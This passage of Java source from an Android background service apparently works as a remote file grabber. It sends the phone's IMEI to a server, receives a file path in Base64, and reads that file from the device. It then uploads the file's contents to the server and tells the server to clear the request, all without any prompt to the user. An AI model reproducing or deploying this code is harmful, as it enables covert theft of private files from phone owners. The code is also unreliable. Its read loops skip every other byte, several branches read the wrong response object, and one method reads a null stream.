                                    HttpEntity filehttpEntity = fileresponse.getEntity();
                                    Fileinputstream = filehttpEntity.getContent();
                                    String Filetext = "";
                                    for (int i = Fileinputstream.read(); i != -1; i = Fileinputstream.read()) {
                                        Filetext += (char) i;
                                        i++;
                                    }
                                    System.out.println("Fupload = " + Filetext);
                                    //delete file
                                    if (Filetext.equals("OK") ){
                                        InputStream deleteinputStream = null;
                                        HttpClient deletehttpclient = new DefaultHttpClient();
                                        String clr = UrlDemo.fileClear;
                                        HttpPost deletehttppost = new HttpPost(clr);
                                        try {
                                            //   TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                            List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                            deletenameValuePairs.add(new BasicNameValuePair("IMEI", serialbaseFiluploadstring));
                                            deletenameValuePairs.add(new BasicNameValuePair("action", "CLR"));

                                            deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                            HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                            deleteresponse.getStatusLine();

                                            HttpEntity deleteentity = response.getEntity();
                                            deleteentity = response.getEntity();

                                            deleteinputStream = deleteentity.getContent();
                                            String deletebuffer = "";
                                            for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                                deletebuffer += (char) i;
                                                i++;
                                            }
                                            System.out.println("deletfile == " + deletebuffer);
                                        }
                                        catch (Exception e){
                                            System.out.println("Exception delete == " +e);

                                        }
                                    }
                                    else {
                                        System.out.println("file not deleted");
                                    }
                                    //delete file on server end

                                    System.out.println("Fileresponse " +Filetext);
                                }

                                catch (IOException e) {
                                    System.out.println("Catch Exception " +e);
                                    e.printStackTrace();
                                }
                            }//try block fupload
                            catch (FileNotFoundException e){
                                e.printStackTrace();
                            }
                            catch (IOException e){
                                e.printStackTrace();
                            }
                        }//if(file.exist()) end

                        else {
                            InputStream deleteinputStream = null;
                            HttpClient deletehttpclient = new DefaultHttpClient();
                            String nfd = UrlDemo.filenotfound;
                            HttpPost deletehttppost = new HttpPost(nfd);
                            try {
                                // TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                deletenameValuePairs.add(new BasicNameValuePair("IMEI",serialbaseFiluploadstring));
                                deletenameValuePairs.add(new BasicNameValuePair("NFD", string));

                                deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                deleteresponse.getStatusLine();

                                HttpEntity deleteentity = response.getEntity();
                                deleteentity = response.getEntity();

                                deleteinputStream = deleteentity.getContent();
                                String deletebuffer = "";
                                for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                    deletebuffer += (char) i;
                                    i++;
                                }
                                System.out.println("Chkdeletfile == " + deletebuffer);
                            }
                            catch (Exception e){
                                System.out.println("ChkException delete == " +e);
                            }

                            System.out.println("Chk File Not Found");
                        }

                        System.out.println("File send == ");
                    }//if(response stratwith 1 end)
                    else {
                        System.out.println("Request Error == ");
                    }

                    Log.d("Test","Response of Upload = " +buffer);
                }
                else {
                    System.out.println("IMEI NUll && serial no null && Android Id not null fileuplaod = ");
                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                    nameValuePairs.add(new BasicNameValuePair("IMEI", uidbaseFiluploadstring));
                    httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                    HttpResponse response = httpclient.execute(httppost);
                    response.getStatusLine();

                    HttpEntity entity = response.getEntity();
                    entity = response.getEntity();

                    inputStream = entity.getContent();
                    String buffer = "";
                    for (int i = inputStream.read(); i != -1; i = inputStream.read()) {
                        buffer += (char) i;
                        i++;
                    }
                    System.out.println("UploadBuffer = = " + buffer);

                    // Receiving side

                    byte[] data = Base64.decode(buffer, Base64.DEFAULT);
                    String text = new String(data, "UTF-8");
                    System.out.println("Decodedata = " +text);


                    //POST FILE
                    if(text.startsWith("1")) {
                        String[] filesplit = text.split (",");
                        String filepath =filesplit[1].toString();
                        String filename= filepath.substring(filepath.lastIndexOf("/") + 1);
                        System.out.println("fileDirectory == " +filepath);
                        System.out.println("fileName == " +filename);

                        byte[] namedata = filename.getBytes("UTF-8");
                        String filenameencode = Base64.encodeToString(namedata, Base64.DEFAULT);
                        String  string = filenameencode.replaceAll("\n", "");

                        System.out.println("fileName == " +string);


                        for (String s : filesplit) {
                            s = s.substring(s.indexOf(",")+1);
                            System.out.println("File Split == " +s);
                        }


                        File file = new File(filepath);
                        int size = (int) file.length();
                        if (file.exists() && size>0 ){
                            System.out.println("file Exist");
                            Log.i("TestSize","TestSize"+size);
                            byte[] bytesdata = new byte[size];

               /* int size = (int) file.length();
                Log.i("TestSize","TestSize"+size);
                byte[] bytesdata = new byte[size];*/

                            try {

                                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(filepath));
                                buf.read(bytesdata,0,bytesdata.length);
                                buf.close();

                                Log.i("bytelength","length"+bytesdata.length);
                                String filedata = android.util.Base64.encodeToString(bytesdata, android.util.Base64.NO_WRAP);
                                Log.i("Test ","Filedata == " +filedata);

                                // Receiving side
                   /* byte[] data = Base64.decode(filedata, Base64.DEFAULT);
                    String text = new String(data, "UTF-8");*/

                                InputStream Fileinputstream = null;
                                HttpClient Filehttpclient = new DefaultHttpClient();
                                String fupload = UrlDemo.fupload;
                                HttpPost filehttpPost = new HttpPost(fupload);
                                try {
                       /* TelephonyManager tm1 = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
                        String imei = tm1.getDeviceId();*/


                                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
                                    nameValuePair.add(new BasicNameValuePair("IMEI", uidbaseFiluploadstring));
                                    nameValuePair.add(new BasicNameValuePair("DATA",filedata));
                                    nameValuePair.add(new BasicNameValuePair("FNAME",string));

                                    filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                                    HttpResponse fileresponse = Filehttpclient.execute(filehttpPost);
                                    fileresponse.getStatusLine();

                                    HttpEntity filehttpEntity = fileresponse.getEntity();
                                    Fileinputstream = filehttpEntity.getContent();
                                    String Filetext = "";
                                    for (int i = Fileinputstream.read(); i != -1; i = Fileinputstream.read()) {
                                        Filetext += (char) i;
                                        i++;
                                    }
                                    System.out.println("Fupload = " + Filetext);
                                    //delete file
                                    if (Filetext.equals("OK") ){
                                        InputStream deleteinputStream = null;
                                        HttpClient deletehttpclient = new DefaultHttpClient();
                                        String clr = UrlDemo.fileClear;
                                        HttpPost deletehttppost = new HttpPost(clr);
                                        try {
                                            //   TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                            List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                            deletenameValuePairs.add(new BasicNameValuePair("IMEI", uidbaseFiluploadstring));
                                            deletenameValuePairs.add(new BasicNameValuePair("action", "CLR"));

                                            deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                            HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                            deleteresponse.getStatusLine();

                                            HttpEntity deleteentity = response.getEntity();
                                            deleteentity = response.getEntity();

                                            deleteinputStream = deleteentity.getContent();
                                            String deletebuffer = "";
                                            for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                                deletebuffer += (char) i;
                                                i++;
                                            }
                                            System.out.println("deletfile == " + deletebuffer);
                                        }
                                        catch (Exception e){
                                            System.out.println("Exception delete == " +e);

                                        }
                                    }
                                    else {
                                        System.out.println("file not deleted");
                                    }
                                    //delete file on server end

                                    System.out.println("Fileresponse " +Filetext);
                                }

                                catch (IOException e) {
                                    System.out.println("Catch Exception " +e);
                                    e.printStackTrace();
                                }
                            }//try block fupload
                            catch (FileNotFoundException e){
                                e.printStackTrace();
                            }
                            catch (IOException e){
                                e.printStackTrace();
                            }
                        }//if(file.exist()) end

                        else {
                            InputStream deleteinputStream = null;
                            HttpClient deletehttpclient = new DefaultHttpClient();
                            String nfd = UrlDemo.filenotfound;
                            HttpPost deletehttppost = new HttpPost(nfd);
                            try {
                                // TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
                                deletenameValuePairs.add(new BasicNameValuePair("IMEI",uidbaseFiluploadstring));
                                deletenameValuePairs.add(new BasicNameValuePair("NFD", string));

                                deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

                                HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
                                deleteresponse.getStatusLine();

                                HttpEntity deleteentity = response.getEntity();
                                deleteentity = response.getEntity();

                                deleteinputStream = deleteentity.getContent();
                                String deletebuffer = "";
                                for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                                    deletebuffer += (char) i;
                                    i++;
                                }
                                System.out.println("Chkdeletfile == " + deletebuffer);
                            }
                            catch (Exception e){
                                System.out.println("ChkException delete == " +e);
                            }

                            System.out.println("Chk File Not Found");
                        }

                        System.out.println("File send == ");
                    }//if(response stratwith 1 end)
                    else {
                        System.out.println("Request Error == ");
                    }

                    Log.d("Test","Response of Upload = " +buffer);
                }
            }
            catch(Exception e){
            }
        }
        else {
            Log.d("UploadcheckconError","FileUpload connection erro");

        }
    }//end of makegetresponse

    private void Clear(){
        TelephonyManager tm =(TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        byte[] imeiFilupload = imei.getBytes();
        String imeibaseFilupload = android.util.Base64.encodeToString(imeiFilupload, android.util.Base64.DEFAULT);
        String imeibaseFiluploadstring = imeibaseFilupload.replaceAll("\n", "");

        InputStream deleteinputStream = null;
        HttpClient deletehttpclient = new DefaultHttpClient();
        String clr = UrlDemo.fileClear;
        HttpPost deletehttppost = new HttpPost(clr);
        try {
            //   TelephonyManager deletetm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            List<NameValuePair> deletenameValuePairs = new ArrayList<NameValuePair>();
            deletenameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseFiluploadstring));
            deletenameValuePairs.add(new BasicNameValuePair("action", "CLR"));

            deletehttppost.setEntity((HttpEntity) new UrlEncodedFormEntity(deletenameValuePairs));

            HttpResponse deleteresponse = deletehttpclient.execute(deletehttppost);
            deleteresponse.getStatusLine();

            String deletebuffer = "";
            for (int i = deleteinputStream.read(); i != -1; i = deleteinputStream.read()) {
                deletebuffer += (char) i;
                i++;
            }
            System.out.println("deletfile == " + deletebuffer);
        }
        catch (Exception e){
            System.out.println("Exception delete == " +e);

        }
    }

    @Override
    public void onDestroy() {
        running=false;
        mytimer.cancel();
        stopSelf();
        super.onDestroy();
    }

}
